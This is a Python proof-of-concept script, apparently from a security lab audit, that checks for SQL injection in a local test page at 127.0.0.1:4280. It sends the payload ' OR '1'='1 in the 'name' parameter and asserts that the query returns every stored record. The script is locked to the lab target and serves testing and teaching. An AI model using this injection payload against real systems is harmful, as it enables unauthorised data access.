#!/usr/bin/env python3
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
from html.parser import HTMLParser

BASE = "http://127.0.0.1:4280/lab_cases/S001/index.php"

parsed = urllib.parse.urlparse(BASE)
if parsed.scheme != "http" or parsed.hostname != "127.0.0.1" or parsed.port != 4280:
    raise SystemExit("目标必须固定为 http://127.0.0.1:4280")

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(
            req.full_url, code, "redirect refused", headers, fp
        )

OPENER = urllib.request.build_opener(
    urllib.request.ProxyHandler({}),
    NoRedirect(),
)

class Parser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.in_p = False
        self.buf = []
        self.texts = []

    def handle_starttag(self, tag, attrs):
        if tag.lower() == "p":
            self.in_p = True
            self.buf = []

    def handle_endtag(self, tag):
        if tag.lower() == "p" and self.in_p:
            self.texts.append("".join(self.buf).strip())
            self.in_p = False

    def handle_data(self, data):
        if self.in_p:
            self.buf.append(data)

def parse_records(html_text):
    p = Parser()
    p.feed(html_text)
    records = set()
    for text in p.texts:
        m = re.match(r"^ID\s+(\d+)[：:]\s*(.*)$", text)
        if m:
            records.add((m.group(1), m.group(2).strip()))
    return records

def fetch(name_value):
    query = urllib.parse.urlencode({"name": name_value})
    url = BASE + "?" + query
    req = urllib.request.Request(
        url,
        headers={"User-Agent": "S001-audit-poc"},
    )
    try:
        with OPENER.open(req, timeout=5) as resp:
            body = resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        raise SystemExit("HTTP 错误或重定向被拒绝，状态码: %s" % exc.code)
    except Exception as exc:
        raise SystemExit("请求失败: %s" % exc)
    return parse_records(body)

def main():
    normal = fetch("Alice")
    payload = "' OR '1'='1"
    test = fetch(payload)

    expected_normal = {("1", "Alice")}
    expected_test = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}

    print("普通请求记录:", sorted(normal))
    print("测试请求记录:", sorted(test))

    if normal != expected_normal:
        raise SystemExit(
            "普通请求断言失败，预期 %s，实际 %s"
            % (sorted(expected_normal), sorted(normal))
        )
    if test != expected_test:
        raise SystemExit(
            "测试请求断言失败，预期 %s，实际 %s"
            % (sorted(expected_test), sorted(test))
        )

    print("PASS: 普通请求仅返回 Alice；测试请求返回全部预置记录。")

if __name__ == "__main__":
    main()
